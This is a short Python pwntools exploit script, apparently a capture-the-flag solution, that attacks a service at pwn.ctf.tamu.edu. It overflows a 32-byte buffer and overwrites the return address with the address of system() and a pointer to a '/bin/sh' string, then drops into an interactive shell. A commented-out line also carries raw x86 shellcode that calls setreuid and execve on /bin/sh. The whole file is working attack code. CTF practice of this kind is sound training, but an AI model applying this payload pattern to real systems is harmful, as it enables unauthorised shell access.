from pwn import *

r = remote("pwn.ctf.tamu.edu", 4324)

print r.recvuntil("Input> ")
#buf = r.recv(20)[:10]
#print r.recvuntil("echo?")

#print "buf address : "+ buf
#print type(buf)
#buf = int(buf,16)
#print type(buf)
#p = "\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\xb0\x01\xcd\x80"
p = "A"*32				#dummy 32byte
p += p32(0x8048430)		#system address
p += "B"*4				#dummy 4byte
p += p32(0x804a030+8)		#/bin/sh
print p
r.sendline(p)

print r.recv(1024)

r.interactive()
